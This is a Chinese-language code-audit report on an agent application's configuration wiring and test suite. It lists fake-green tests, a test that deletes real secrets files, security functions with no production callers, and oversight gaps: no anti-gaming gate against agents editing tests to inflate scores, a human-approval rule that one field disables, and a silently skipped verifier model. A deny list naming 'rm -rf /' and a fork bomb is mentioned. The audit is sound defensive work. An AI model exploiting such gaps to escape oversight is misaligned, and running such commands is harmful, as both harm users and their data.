| REV-425 | 三端 | 中 | 配置装饰 + 静默降级 | **"验证模型"配置无人读取，Judge 模型选择无日志**：`Configs/modelRouter.json:43` `routing.verifierModel` 仅被 `Src/main.ts:481` 读入并塞进 `Src/Infra/Llm/Router/modelRouter.ts:23` 的类型字段，`Src/**` 内无任何取值点；L3 的模型实际由 `Src/Services/ReviewerAgent/reviewerAgent.ts:195-212 pickJudgeModel` 决定——优先 `currentConfig.judgeModel`（**全仓无 Configs 写入方**，`grep judgeModel Configs/*.json` 为空），否则遍历候选取第一个"异模型且已注册"者。影响：设置/文档里的"验证模型"与真实裁判模型各走各路；`:191` 与 `:193` 明确写了未配置且候选全不可用时"管线降级为 L1+L2（仍满足 `minLevelsRequired=2`）"，即 ADR-0004 的 Maker≠Checker 在降级路径上被静默跳过且无 warn（叠加 REV-326 的 60s 超时更容易撞上）。修复：让 `verifierModel` 成为 `judgeModel` 的来源，降级与"无候选"各记一条 warn 并在验证结果里标注 L3 未执行。 | ✅复核 |
| REV-426 | 资产 | 低-中 | 版本轨装饰 | `Prompts/versions/manifest.json` 固定 10 项、全部 `1.0.0`、`lastUpdated:"2026-09-14"`，而其后 `Prompts`/`Skills` 有实质提交（`git log`：`b2c705a` 桩实现治理四批收口 FE-055~072、`7d5240a` 全目录 README 索引与对账校准），版本号与 `changelog` 均未变动；`promptRegistry.ts:122` 侧又只校验文件存在、版本仅记日志（见 REV-416）⇒ 版本轨既不被维护也不被校验。修复：加一条 `Scripts` 校验（文件 mtime/hash 与 manifest 版本不符即 fail），或删掉 manifest 只保留装载对账。 | ✅复核 |
| REV-427 | 资产 | 低-中 | 基线为手写字面量 | `Benchmarks/baselines/metrics.json`（`recordedAt:2026-09-14`）记 `testCount:582 / testFilesCount:24 / testPassRate:1.0` 与六维评分（正确性 1.0 / 韧性 0.95 …），但全仓**无任何脚本读取或刷新它**（`Scripts/experimentMatrix.cjs:21` 只守 `Benchmarks/experimentMatrix.json`；`Tests/gateG0.spec.ts:30` 只断言 `benchBaseline.json` 文件存在）；当前实测 `find Tests -name '*.spec.ts'` = **150** 个文件、`it(`/`test(` 计数 **1695**，与基线差一个数量级，六维评分亦无计算来源。影响：`Docs/99-审查记录/后端Harness与Loop工程合规审查报告.md:187` 把它当"✅ 已登记（582 项测试/六维评分）"的达成证据，而 `Docs/Agent/13-构建与实施/项目构建顺序.md:513` 已自证 CI 里没有任何 benchmark/劣化比对步骤。修复：基线由脚本生成（含 per-suite 明细）并在 CI 做劣化比对，否则该文件不应作为任何"已达标"的凭据。 | ✅复核 · ✅实证（`find`/`grep` 计数与 `Scripts` 消费面） |

**已核对为干净（M15）**：`Configs/security.json:2-6` 的 `trustLevels` 三类角色划分与 `denyReasonForAgentRole`（`agentFactory.ts:65-66` G-11 治理角色不得赋权）一致，治理角色无法被招募伪造；`Prompts/roles/*` 的 8 个文件与 `manifest.json` 的 10 项覆盖完整（无未登记文件）；`buildStableSystemPrompt:110` 的缓存键含角色段与资产段（`\u0000` 分隔），不会跨角色命中同一提示词；`:119-121` 缓存上限 64 的清理路径正确；`mainLoop.md` 的资产段确实随 `getSystemMainLoop()` 进入发送内容（与 REV-414 的 playbook 情形相反）；`Skills/strategies/candidates.json` 的 `version/description` 与被消费字段之间无冲突；`listSkills` 的 `.md`-only 在 IPC 侧至少与 `Skills/` 当前内容不产生错误条目。

### 20.1 统计与归类

新增 **15 条**（REV-413~427）：高 **4**（REV-413/418/419/420）· 中高 **1**（REV-414）· 中 **8**（REV-415/416/417/421/422/423/424/425）· 低-中 **2**（REV-426/427）。

按既有成因族归并，M15 把两族的规模推到全仓最大：

- **F5 已实现未接线（孤岛）**：REV-414/415/418/419/421/423/424/425/427 共 **9 条**。本片集中体现了同一模式——**资产写好了、配置建好了、UI 控件也摆好了，中间那段"读取并生效"的代码从来没写**。判别口径已可固化：任何 `Configs/*.json` 的新键或 `Client/src/config/configSchema.ts` 的新控件，必须有一条断言证明 `Src/**` 里存在读取点（本轮即用此口径证伪了 `reasoningSandwich.*`、`antiGaming*`、`routing.verifierModel` 三处）。
- **F4 指标被伪造**：REV-422/427（权重拼成文本、基线为手写字面量且被文档当证据）。
- **F1 身份可自报 + 零鉴权 / F3 可观测性链断裂**：REV-416/417/420/425 属治理与安全侧的"退化无信号"。
- **F2 fail-soft 洗成空成功**：REV-421 的裸 `catch`、REV-416 的静默跳过（技能清单读取失败洗成空已在 **REV-113** 登记，本片不重复；`ipcBridge.ts:801-808` 的 `ipc-get-custom-tools` 恒空属同一处置，建议并入 REV-113）。

### 20.2 建议归并到的修复批次（不新增工单号，待并入 §16.3）

| 归入 | 条目 | 理由 |
|---|---|---|
| **P1-9 令牌与身份权威**（扩名为"治理红线"） | REV-420 | 与 CRITICAL 双人裁决属同一红线，必须在同一批里补"白名单范围护栏 + CRITICAL 强制人工" |
| 新增建议批次 **P1-11 资产-代码接线对账** | REV-414/415/418/419/421/423/424/425/426 | 九条同根，且根因可由**一条门禁**统一拦住（`Configs`/`configSchema` 键必须有 `Src` 读取点的断言）；逐条硬修而不建门禁，下一批资产仍会漂 |
| P2-4 体验与口径 | REV-413 的输出契约部分、REV-422/427 | 标度统一、基线生成脚本、角色段的 JSON 契约 |
| 归 P0-4 主链路 | REV-413 | 影响的是**每一次对话**的提示词一致性，属主链路正确性而非内容美化 |

### 20.3 需要真实环境才能取证的项目（M15）

| 待验证项 | 关联条目 | 需要的动作 |
|---|---|---|
| 角色段与静态段的矛盾是否真的改变模型行为（有无 JSON 输出污染） | REV-413 | 同一会话连续 3 轮真实调用，抓取发出的 system 首段与回复结构比对 |
| 前缀缓存是否因热重载失效 | REV-416/417 | 改一次 `worker.md` 后连续 5 轮，比对 provider 侧 cached tokens |
| 关掉 `antiGamingMaxChangedFiles` 后单轮改动文件数的实际上界 | REV-419 | 跑一次"改测试刷分"的对抗任务，统计 `git diff --name-only` 条数 |
| `autoApprove.tools` 填入 `shell.exec` 后是否真的无提示执行 | REV-420 | 需要用户明确授权后再做（涉及真实不可逆工具），本轮**未执行** |
| L3 在候选模型均不可用时是否留下任何日志 | REV-425 | 断网/清空 Key 两种条件下跑 `performReview` |

### 20.4 一句话结论

M15 的问题不是"提示词写得不好"，而是**内容资产面与运行面之间几乎没有接线**：`Skills/playbooks` 从未发给模型、`reasoningSandwich`/`antiGaming`/`verifierModel` 三组配置（含两个 UI 控件与一条被写成红线的约束）零消费者、`assembly_node` 与 `behaviorCode.md` 两份资产永不被请求、`Benchmarks` 基线是没人刷新的手写字面量——而其中最危险的两条恰好是**安全侧**：反博弈门控不存在（REV-419）与 CRITICAL 双人红线可被一个字段关闭（REV-420）。本片的修复优先级应排在文档口径之前，但排在任何"提示词措辞优化"之前先建那条"配置键必须有读取点"的门禁（P1-11），否则下一批资产仍会以同样方式沉底。


---

## 21. M16 本地测试面（`Tests/**` 与 vitest / CI 门禁接线，REV-428~450）

> 切片：`Tests/**`（21 个目录 / 150 个 spec / 约 31k 行）、根 `vitest.config.ts`、`.github/workflows/ci.yml` 的 test 与 build job、`Configs/{coverageBaseline,benchBaseline}.json`、`Scripts/experimentMatrix.cjs`、`Tests/gateG0.spec.ts`。
> 这是 M01~M15 全部 450 条里唯一一条**元层面**的片子：它不评"代码有没有 bug"，而评"**凭什么说代码没有 bug**"。M14 已对云端 `Server/test` 得出同一结论（REV-384/385/402），本片在本地部署线上找到同型且更严重的形态。
> **重复项处理**（不立项，交叉引用）：子代理报的"CI 读不到 `coverage-summary.json` ⇒ test job 恒红"= 已登记 **REV-301**；"`Tests/**` 被三处 tsconfig exclude、lint 只跑 `Src/`、测试代码全仓不受类型检查"= 已登记 **REV-308**（本片实测 `tsconfig.json:49`、`tsconfig.electron.json:14`、`tsconfig.build.json:28` 三处确实都排除）；"`build` job 与 `lint` job 逐字重复、不产出安装包"= 已登记 **REV-300/303**；"`isNetworkAllowed` 生产零调用"的**代码侧**= 已登记 **REV-063**；"前端把同一 `decidedBy` 套给所有角色"= 已登记 **REV-040**。本片只登记这些缺陷的**测试面后果**。
> 证据标注：23 条中 `✅复核` 19 条（主审逐文件读码或跑只读统计），`✅实证` 4 条（REV-428/430/431/449 用只读命令复现数值），REV-433/440/441/446 的个别行号为子代理给出未逐条重读（`△子代理`）。

| ID | 层 | 严重度 | 类别 | 现象 · 影响 · 修复 | 证据 |
|---|---|---|---|---|---|
| REV-428 | 服务+CI | 严重 | 假绿（测试自我跳过） | **无 LLM 密钥时"真实调用"用例计为通过但执行 0 个断言**：12 处 `it()` 首行写 `if (!process.env.HUAWEI_MAAS_API_KEY) { console.log('SKIP…'); return; }` —— `Tests/AgentRuntime/realAgent.spec.ts:170,261,323,407`、`Tests/E2E/{directExecution:212,assemblyLineMode:344,consortiumMode:331,delegationMode:331,litigationMode:434}.spec.ts`、`Tests/Infra/llm.spec.ts:245,277,476`（另 `realAgent.spec.ts:155` 是 beforeAll 内纯打印）。`return` 在 vitest 里是**通过**而非 skipped，故主审"全域 `.skip/.todo/.only` 计数为 0"的口径抓不到它；GitHub runner 无该密钥 ⇒ `ci.yml:35` 每天产出"全绿"。影响：`Benchmarks/experimentMatrix.json:19` 的 `BEN-WORKER` 格标 `existing-covered` 且锚点正是 `realAgent.spec.ts`，Gate G9 的"真实调用"声称在任何 CI 运行里**从未执行过一次断言**；这也是 §16.12/§17 那些"真实取证"与 CI 绿灯之间没有桥梁的原因。与云端 **REV-402**（`verify-e2e.ps1` 失败只标红不 `exit 1`）同型、与 **REV-384**（`describe.skip` 静默跳过）同族但更隐蔽。修复：改 `it.runIf(hasKey)` 或显式 `throw`，并让 CI 在缺依赖时非 0 退出 | ✅实证（`grep -rn "process.env.*API_KEY" Tests` = 13 处 / 7 文件，逐处读上下文确认 12 处为 it 内 `return`） |
| REV-429 | 服务+桌面 | 严重 | 安全（测试破坏生产凭据） | **单测的 setup 步骤删除开发者真实的密钥文件**：`Tests/Infra/secretsStore.spec.ts:23-25` 把路径**硬编码**为 `<repo>/Data/.secrets/providers.json.enc`，`beforeEach:41-43` 若该文件存在则 `copyFileSync → .testbak` 然后 `rmSync` 真实文件，`afterEach:46-52` 再还原。实测本机该文件确实存在（739 B，mtime 2026-10-08），而 `Src/Infra/Security/secretsStore.ts:81` 经 `getSecretsDir()`（`pathResolver.ts:208 join(dataRoot,'.secrets')`）在开发态解析到**同一个目录**——即测试与生产凭据同源。三重风险：① 还原全押 `afterEach`，用例超时被强杀 / 进程崩溃 / 打包门禁与 `npm test` 并发（`vitest.config.ts` 无 `fileParallelism:false`，见 REV-446）都会留下 `.testbak` 而应用读不到任何密钥，表现为"密钥凭空丢失"；② `.testbak` 是固定名，两个 vitest 进程并发即互相覆盖备份；③ 一旦设了 `CIVITAS_DATA_ROOT`，硬编码路径与被测模块写入路径**分家**，备份/还原指向空文件，真实写入点无人清理。修复：夹具改 `mkdtempSync` + `CIVITAS_DATA_ROOT`（同目录的 `userConfigWriter.spec.ts:44` 已是正确写法），禁止任何测试触碰 `Data/` | ✅复核（**未实跑该 spec**，避免删动用户凭据；破坏路径由 `:23` 与 `pathResolver.ts:208` 的同源性直接成立） |
| REV-430 | 服务 | 高 | 假绿（前置失败即 0 断言） | **`if (!x.ok) return` 作为用例主体前置共 142 处**：实测 `grep -rE "if \(![a-z_.]+\.ok\) return" Tests --include=*.spec.ts` = **142**；抽样 `Tests/AgentRuntime/agentRuntime.spec.ts:169-170`（`createAgent(...)` 后 `if (!worker.ok) return;`）与 `Tests/Parallel/parallelCollaboration.spec.ts:156`（`createWorktree` 同理）。影响：被测函数一旦开始返回 `err`（正是 REV-332/344/345 那一类真实故障的表现形式），这些用例**静默通过**，测试面在最需要报警的时刻失声。修复：把前置 `err` 变成硬断言（`if (!worker.ok) throw new Error(...)` 或先 `expect(worker.ok).toBe(true)`），并加一条 lint/政策测试禁止该形态 | ✅复核（计数由主审只读复现） |
| REV-431 | 服务 | 高 | 测试建立生产不存在的前提（REV-332 家族根因） | **测试的隔离手段是生产从不调用的函数**：`Src/**` 共导出 **88 个** `reset*/clear*` 符号（实测 `grep -hoE "export function (reset\|clear)[A-Za-z]+" Src \| wc -l`），抽样五个的生产调用点与测试调用点：`clearMigrations` 0/69、`resetEventBus` 0/45、`resetWalletManager` 0/19、`resetRolePrompts` 0/11（`promptRegistry.ts:70` 注释自陈"测试/诊断用"）、`clearMiddlewares` 0/9 —— 合计仅这五个就有 **153 次**测试内调用。生产侧只在 `main.ts` 启动时装配一次，运行期没有任何重置点。影响：凡是"跨重启累计才暴露"的缺陷在这一层结构性不可见——REV-332（`agentCounter` 进程级归零撞历史行）、REV-084（运行期立法重启丢失）、REV-177（空账本假守恒）、REV-336（幽灵 Agent 行）全是同一机制的产物，而它们当初都能"全量单测绿灯"。修复：把重启类用例改为 `closeDatabase()+reopen+migrateUp+hydrate*` 的真实重启模拟（现有四条 `hydrate*` 用例已具备该形态，可作为模板），并给 `reset*` 加"仅测试可见"的编译期隔离 | ✅实证（计数与调用点均只读复现） |
| REV-432 | 前端+服务 | 高 | 测试自造 oracle（身份权威） | **治理红线的判定规则在测试里被重写了一份更宽松的版本**：`Tests/Client/inline-approval.spec.tsx:38-47` 以注释"与后端 approvalIdentity 同构"为名，用正则 `/^agent-[a-z_]+-\d+$/i` 决定"是不是独立行为主体"，不匹配就绑到 `h.owner`；真实实现 `Src/Services/Governance/approvalIdentity.ts:77-83` 是 `deps.getAgentById ?? getAgent(id)`——**必须在注册表里查得到且角色匹配**才算独立主体，否则作为人类代理接受并标 `proxiedByHuman`。分叉后果：测试口径下"任何未注册但形如 `agent-x-1` 的自报串"即可充当第二票，生产口径则要求真实注册。这是 **REV-332 已修的 agentId 形态**与 **F1 身份可自报**家族的交点。影响：该用例把更弱的规则锁成期望值，改紧生产实现会红、放宽实现不会红，"前后端同一口径"（REV-264 诉求）永不被交叉验证。修复：mock 只负责回传后端契约字段，`decidedBy` 绑定规则改为从 `Src` 导入或由契约测试对账 | ✅复核 |
| REV-433 | 服务 | 高 | E2E 名不副实 | **`Tests/E2E/**` 不起进程、不走 HTTP/IPC**：9 个 mode spec 里 6 个纯 in-process 自问自答（实测全目录 `grep "listen(\|spawn(\|fetch(\|ipcBridge"` 仅命中 5 处 `base_url` 字面量，无一处真实网络/子进程）。`directExecution.spec.ts:152-166` 的"编排器端到端"实为同步调 `receiveTask()` 断言 `status:'success'`；`:192-205` 的"事件链"读的是测试进程内 `getEventLog()`。影响：与云端 `Server/scripts/verify-e2e.ps1`（**REV-402**）合成"两套 e2e 都不是端到端"——于是 REV-338/341/342 那类"只在真实 HTTP/进程里暴露"的缺口（无执行驱动、provider 拒 `tool` 消息、库行与内存状态漂移）在本层**结构性不可见**；§16.12 已自证"这份全量绿灯不能说明链路通"，本片给出原因。修复：要么改名 `Tests/Integration/orchestration`（诚实降级），要么真起 `startServer()` 走 REST+IPC 一轮 | ✅复核（grep 面）/ △子代理（个别行号） |
| REV-434 | 三端+CI | 高 | 覆盖率口径与被测面错位 | **"测试写了但覆盖率看不见"在前端整块成立**：`vitest.config.ts:26` 的 `coverage.include` 只有 `Src/**/*.ts` 与 `Client/src/ai-components/**`，而 `Tests/Client/**`+`Tests/AIComponents/**` 共 34 个 spec 的被测对象绝大多数落在 `Client/src/{stores,services,views,components,hooks,config,shared}`——即分母之外。影响：`Configs/coverageBaseline.json:2` 的 `coverageMinimum` 只约束 `Src`，前端可整块回退而门禁数值不变；叠加 **REV-301**（CI 读不到 `coverage-summary.json` ⇒ test job 恒红）与 **REV-308**（Tests 不被 tsc 检查）后，CI 的"测试"job 实际能证明的只有"Src 被测过"这一件事，且当前连这件事的证明通道是断的。云端对应面为 **REV-412**（Server 不在分母）。修复：分口径出 `Src`/`Client`/`Server` 三张覆盖率并各自设 `coverage.thresholds`，让门禁直接读 vitest 的失败而非自制脚本 | ✅复核（`vitest.config.ts` 由主审整读） |
| REV-435 | 服务+CI | 高 | 门禁零接线 + 锚点只验存在 | **实验矩阵守门脚本从不运行，且运行也拦不住失配**：`Scripts/experimentMatrix.cjs` 在 `package.json` scripts、`.github/workflows/ci.yml`、`.husky/*` 三处**均无引用**（实测 grep 空），而 `Scripts/README.md:19` 声称"门禁类脚本（`experimentMatrix.cjs`）在 CI 中执行，失败以非 0 退出码阻断"；即便运行，`:79-81` 对 18 个 `existing-covered` 格只做 `fs.existsSync(anchor.ref)`（**文件存在即算覆盖**），从不看该文件是否断言了 oracle。影响：`Benchmarks/experimentMatrix.json` 的 42 格可以随时失配而无人报警，`BEN-BOOT → Tests/gateG0.spec.ts`（oracle 写的是"启动无 FATAL"）实际只跑 `existsSync`+`JSON.parse`（见 REV-442）。修复：CI 加 `node Scripts/experimentMatrix.cjs` 步骤、`@matrix` 标签与格子双向对账、锚点校验升级为"文件内存在对应 `it` 标题且含 expect" | ✅复核（零接线由主审 grep 复现；`:79-81` 逻辑主审整读） |
| REV-436 | 服务+资产 | 高 | 用零调用函数认证安全属性 | **SEC-PRIVESC / SEC-NET 两格断言的三个函数在生产链路 0 调用点**：`Tests/Experiments/adversarial/security.spec.ts:112-132` 直接调 `isNetworkAllowed('evil.example.com')`、`isToolAllowed('DANGEROUS','L2')`、`whitelist.registerTool({dangerLevel:'FORBIDDEN'})` 并断言。实测调用点：`isNetworkAllowed`（`Src/Infra/Security/whitelist.ts:130`）、`isToolAllowedForRole`（`:102`）、`isRegistered` 在 `Src/`+`Client/src`+`Server/src`+`electron/` 全域**仅命中定义处**；`isToolAllowed`（`trustLevels.ts:206`）同。`main.ts:232` 确实把 `security.networkWhitelist` 灌进了 `networkAllowed` 集合，但没有任何执行点去查询它。影响：`experimentMatrix.json:41,42` 据此标 `new-scaffold`+gate G1/G4，等于"权限提升已被防住"是一条由死代码自证的结论；M15 的 **REV-420**（`autoApprove.tools` 一个字段即可绕过 CRITICAL 双人）正落在这块空白上——两道"防线"都没有执行点。代码侧零调用已登记为 **REV-063**，本条登记的是**测试与评估面把死函数计入覆盖**。修复：用例改走 `dispatchToolCall`/中间件链并以 `Configs/security.json` 真值初始化；矩阵格在接通前降为 `declared-only` | ✅复核 |
| REV-437 | 服务 | 中高 | 注入检测用例用生产送不出的字符串 | `Tests/Experiments/adversarial/security.spec.ts:231-244`（SEC-INJ / SEC-SPY）以 `action:'prompt_injection'`、`'access_private_context'` 喂 `checkViolation` 并只断言正向 `violated === true`，零负向对照；而唯一生产调用点 `Src/Services/LoopControl/middleware/toolSafetyGate.ts:209-212` 传的是 `action: input.toolName`（真实工具名如 `shell.exec`），匹配器 `behaviorCode.ts:151-153` 只认关键字包含 ⇒ `safety-001/002/cooperation-001` 在真实链路上恒不命中，`communication-001`（`enforceable:true`，条件 `agent.encounter(critical_anomaly)`）在匹配器里根本没有分支；`Configs/security.json:24-28` 的 `criticalSecurityEvents`（含 `INJECTION_DETECTED`）在 `Src` 内无消费者。影响：这是 **REV-080**（代码侧"enforceable 全是装饰"）的测试面同谋——该域看起来有对抗用例，实际从未测过真实链路。修复：用例改为"起中间件 + 真实 toolName + 运行期立法"，每条 `enforceable` 规则补一正一负 | ✅复核 |
| REV-438 | 服务 | 中高 | quorum 覆盖空白 + deps 失真 | `approvalIdentity` 的**人类代理分支**（`Src/Services/Governance/approvalIdentity.ts:160-173`：非 `agent-*` 形态一律接受为人类代理并标 `proxiedByHuman`）在全部 `Tests/**` 中无任何用例；`Tests/Governance/approvalIdentity.spec.ts:15-26` 注入测试自建 `AGENTS`/`getOwner` 字典，而生产 `Src/Interface/RestApi/approvalApi.ts:116` 调的是 `bindApprovalIdentity(decidedBy, verifiedUserId ? { verifiedUserId } : {})`——**从不注入 `getAgentById`/`getOwner`**（实测确认）。影响：真实绑定路径（默认取 `getActiveOwner()` + 注册表查 Agent）从未被执行；"同一次会话以两个角色名各投一票、身份同为活动账号"这条绕过通路无测试。前端侧同类现象已由 **REV-040** 登记，不重复。修复：补 deps-缺省 用例（走真实 `getAgent`）与 human_proxy 双票用例 | ✅复核 |
| REV-439 | 三端 | 中高 | 政策测试口径与原则差一个家族 | `Tests/Infra/noSilentErrorSwallow.policy.spec.ts` 是本仓最好的门禁设计（TS AST 精确找空 catch、`:78-80` 还自带"扫描确实命中代码"的反假通过断言），**但射程只覆盖原则的一角**：`:54-65` 只在 `catch` 块**零语句**时记违规 ⇒ 本仓最主要的洗白形态 `catch { return { ok:true, data:[] } }`（**REV-113**）、`if (!content) continue`（**REV-416**）、`catch { available = false }`（**REV-384**）全部合法通过；扫描面 `:23` 仅 `Src/`，不含 `Client/src` 与 `Server/`，而 REV-113/116 恰恰发生在前端。影响："不得静默吞错"这条用户明确原则的门禁，测的是最容易被写坏的那一种（空块），漏掉的是实际发生的那一种（有返回值的吞）。修复：把"catch 块内出现 `return {ok:true}` / `return []` / `continue` 且未记日志"纳入同一 AST 遍历，扫描面扩到三端 | ✅复核 |
| REV-440 | 服务 | 中高 | 桩替身漂移锁死分支 | `Tests/Decision/taskDriverChain.spec.ts:30-44` 把 `getSubtask` 桩成 `undefined \| { status: string }`，而真实 `SubtaskRow`（`Src/Infra/Db/Repositories/subtaskRepository.ts:26-42`）有 16 个字段（含 `failure_count`、`token_budget`、`max_iterations`、`timeout_ms`、`depends_on`）⇒ 驱动代码读这些字段时恒为 `undefined`，**REV-344/347** 修的 `subtasks`/`started_at` 分支在此桩下永不进入；`:37` 又 `vi.mock('…/agentExecutor.js')` 整模块替换 `executeAssignedTask` ⇒ **REV-345/346** 的预算/时限钳制从未参与这条链。同类：`Tests/Core/modelTimeoutTiers.spec.ts:70` 把 `chatStream` 桩成恒 err。缓解面：该 spec 对 `subtaskRepository` 用了 `importOriginal` 保留其余导出（写法本身正确），问题只在桩值的形状。修复：桩返回值用 `satisfies SubtaskRow` 强制与真实类型对齐；整模块替换的 executor 改 spy 而非替身 | ✅复核 · △子代理（`modelTimeoutTiers.spec.ts:70`） |
| REV-441 | 服务 | 中高 | 超时用例只压小值 | 全部超时类用例都把阈值调到不可能失败的小值：`Tests/Durable/faultInjection.spec.ts:69,82`（`initEffectJournal({ defaultTimeoutMs: 1 })`、`timeoutMs: -1`，生产默认 30000）缺"慢而成功不得判 UNKNOWN"的反向断言；`Tests/LoopControl/toolSafetyGate.spec.ts:172` 用 `approvalTimeoutSec: 0.15`，生产 `main.ts:261` 是 **300** ⇒ **REV-348** 实测的"审批挂住整条后台队列 605s"从未被测；全域 150 个 spec 中只有 2 个文件用 `vi.useFakeTimers()`（`Tests/Core/rateLimiter.spec.ts:119`、`Tests/Governance/arbitratorPoolBridge.spec.ts:191,211`）。影响：时间维度上测试与生产是两个系统。修复：至少各留一条用生产真实量级（fake timers 推进）的用例 | ✅复核（数值由主审复现，`-1` 用途见注释） |
| REV-442 | 服务+CI | 中 | 门禁清单硬编码 + 顺序依赖 | `Tests/gateG0.spec.ts:24` 标题写"全部 14 个配置文件"并硬编码 14 项清单，而 `Configs/` 实有 **16** 个 JSON（漏 `dataStorage.json`、`tools.json`）⇒ 新增配置既不进 G0，也不会因缺读点变红（正是 M15 提的 P1-11 该落的位置）；8 条断言全部止于"存在 / 键存在 / JSON 合法"，`durable.json` 的 `journalRetentionDays`、`pendingAlertThreshold` 等无读取点也照样绿；`:70-71` 把 `Data`、`Logs` 列入必备目录并 `existsSync`，而 `.gitignore:14,15` 忽略两者、`git ls-files Logs` = **0** ⇒ 干净 checkout 上该用例只能靠别的 spec 先 `mkdir` 的副作用通过（并发下是竞态，也是"本地绿 CI 红"的候选源）；`:117` 标题称"比例为 0-1、时长带单位后缀"实只查 3 个类型；`:102` 仅 `zones.length >= 4`。修复：清单改读目录快照、`Data/Logs` 断言改"不存在也必须可启动"、标题与断言逐条对齐 | ✅复核 |
| REV-443 | 前端 | 中 | 零断言与自证用例 | `Tests/AIComponents/eventBusBridge.spec.ts:82,103,110` 三个 `it()` 只有注释没有断言（`:85` 还写"由后续集成测试验证"，而该后续不存在；`:82` 的标题正是 `disconnectBridge()` 的语义，其"全仓无调用点"已由 **REV-168** 登记）。`Tests/AIComponents/typesAndLatency.spec.ts:16-27` 对自己刚赋的字面量断言（`const event = {id:'evt-001'…}; expect(event.id).toBe('evt-001')`）、`:60-66` 对**测试内手写的数组**断"5 个族齐全"（`ComponentFamily` 是 type 别名，无运行时枚举，且 REV-308 说明根本没有 tsc 校验）、`:193-225` 把被测换成局部 `new Set<Function>` 测遍历性能（注释自认）。`registry.spec.ts:58-78` 标题称"重复注册会覆盖"却只断 `toBeDefined()`。影响：改名、删族、真实分发变慢都不会红。修复：删掉或改写成行为断言，零断言用例纳入政策测试 | ✅复核 |
| REV-444 | 前端 | 中 | 主链路与事件入口零覆盖 | 实测 `grep -rln "AppRoot\|AppLayout\|hooks/" Tests` 仅命中两个"把源码当文本读"的 Infra spec，**没有任何测试 import `Client/src/App.tsx`/`AppRoot.tsx`/`AppLayout.tsx`/`hooks/*`**。后果：`useEventBus`（唯一事件入口，只在 `AppLayout.tsx:110` 挂载）以及 `backend-event → eventBusBridge → useEventBus → eventStore → store → 订阅者` 这条整链从未贯通一次；而 `Client/src/AppRoot.tsx:5-8` 的注释宣称"测试渲染与生产完全一致的入口组合（含路由）"。影响：M11 那批前端缺陷（REV-251~324）大多属"接线缺失"，而接线缺失在这一层不可见。修复：至少补一例 AppRoot 渲染 + 一例事件入链集成用例 | ✅复核 |
| REV-445 | 三端 | 中 | 镜像与分类口径无守卫 | 实测 `Client/src/shared/eventTypes.ts` **缺** `agent:todo_updated`，而后端 `Src/Services/EventBus/eventTypes.ts:35` 有；前端消费方 `Client/src/stores/todoStore.ts:69` 直接手写字符串常量 `TODO_EVENT_TYPE`，绕过"前端零自造字符串"的生成物约定；`package.json:20` 的 `gen:event-types` 不在 CI 任何步骤 ⇒ 镜像只会越漂越远（漂移本体已登记 **REV-315**，本条登记"无守卫"）。同型第二处：`inferSubgroup` 两份实现口径相反——后端 `Src/Core/Middleware/toolCallClassifier.ts:24` 先 `toLowerCase()`（`Read_file` → read），前端 `Client/src/ai-components/harness/toolVisuals.ts:164` 大小写敏感（→ system），而 `Tests/AIComponents/subscribeAndToolGroup.spec.ts:145-147` 把分叉**写成期望值**，标题自陈"大小写敏感：Read_file → system（非 read）"。修复：CI 加"重新生成并 diff"步骤 + 一条两侧口径一致性断言 | ✅复核 |
| REV-446 | 服务 | 中 | 测试库落进生产数据树 + 两套约定并存 | 实测 40 个 DB spec 一律硬编码仓库相对路径且不读 `CIVITAS_DATA_ROOT`、不走 `resolveDataPath`，其中 `Tests/Governance/governanceLedgerPersistence.spec.ts:23` 等 18 个写在 **`<repo>/Data/_test_*`**（生产数据根，`Configs/default.json:6 dataDir:"Data/"`），而 `Tests/LoopControl/approvalQuorum.spec.ts:26` 用 `.tmp/test-db-*` —— 两套约定并存；根 `vitest.config.ts` **无** `fileParallelism:false`（云端 `Server/vitest.config.ts:9` 有，且云端据此得出 REV-386 共享库毒化）。另 `Tests/Services/loopWorkspaceInjection.spec.ts:26` 硬编码 `F:\ProjectCode\…` 绝对路径，`Tests/Parallel/parallelCollaboration.spec.ts:50` 用 `/tmp/test-data`（Windows 落 `<盘>:\tmp` 且不清理）。现状缓解：实测 `Data` 下 `_test*` 残留为 0、`Data/` 与 `Logs/` 均在 `.gitignore` ⇒ CI 不会拿到遗留产物，"旧 coverage 虚绿"在本仓不成立。修复：统一 `mkdtemp(os.tmpdir())` 并注入 env；测试面是否需要串行由是否共享库决定 | ✅复核（残留与 gitignore 由主审实测） · △子代理（18/40 的计数） |
| REV-447 | 服务 | 中 | 夹具自造安全配置 | `Tests/Integration/agentPermissionSplit.spec.ts:29-30` 用 `initWhitelist({ forbiddenPaths: ['Data/Auth/'], forbiddenCommands: [] })` 与 `initPathGuard({ projectRoot: resolve('.'), forbiddenPaths: ['Data/Auth/'] })`，与 `Configs/security.json:9-16` 的真实值（`forbiddenPaths` 含 **`~/.ssh/`**、`forbiddenCommands` 含 `rm -rf /` 与 fork bomb）背离：既漏掉 `~/.ssh/` 这条唯一"硬禁"，又把命令表清空。影响：**REV-039**（`~` 未展开 ⇒ 禁清单形同虚设）与 **REV-041**（`shell.exec` 越界可绕）这一类"配置与实现的口径漂移"在该测试里不可能显形。修复：夹具改为读 `Configs/security.json` 真值（或至少与真值对账一条断言） | ✅复核 |
| REV-448 | 服务 | 中 | 守恒断言为空 | `Tests/TokenEconomy/tokenEconomy.spec.ts:6` 头注宣称覆盖"TokenLedger（交易记录/守恒验证/trace 汇总）"，实测其导入的 `verifyLedgerConservation`、`summarizeTrace`、`getTransactionCount` 在全部 `Tests/**` 的调用点为 **0**（只有 `clearLedger` 被调）——而 `tsconfig.json:49` 排除 Tests、`package.json:30` lint 只跑 `Src/`（**REV-308**），未使用导入既不报 tsc 也不报 eslint，于是"主张覆盖、实际零断言"长期无人拦。第二条：`tokenEconomyWiring.spec.ts:71,101,114,127` 全部由测试进程直接调 `recordIterationEconomy({promptTokens, completionTokens})`，从不驱动 `runIteration`；生产入参是 `Src/Core/Loop/runIteration.ts:688-689` 的 `callResult?.usage.prompt_tokens ?? 0`，且 `Src/Core/Loop/loopEconomy.ts:40` 在 `totalTokens <= 0` 时**静默 return（无日志无事件）** ⇒ "钱包恒定、档位永不产生"（FE-065 修复前的原状态）测不出，属 **REV-332** 同型。守恒公式自身两口径互斥（`tokenLedger.ts:56-57` 与 `walletManager.ts:261-262`）另见 **REV-194**。修复：补真实驱动用例 + 三个符号要么断言要么删 | ✅复核 |
